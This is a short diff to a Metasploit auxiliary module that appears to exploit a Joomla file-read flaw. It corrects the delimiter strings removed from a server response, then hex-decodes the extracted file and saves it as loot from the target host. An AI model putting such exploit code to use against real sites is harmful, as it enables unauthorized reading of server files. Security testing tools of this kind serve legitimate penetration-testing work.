@@ -53,7 +53,7 @@ class Metasploit3 < Msf::Auxiliary
 
     file = /qcuhq(.*)qohvq/.match(resp.body)
 
-    file = file[1].gsub('qgjuq', '').gsub('qirpq', '')
+    file = file[1].gsub('qcuhq', '').gsub('qohvq', '')
     file = [file].pack("H*")
 
     path = store_loot("joomla.file", "text/plain", datastore['RHOST'], file, datastore['FILEPATH'])
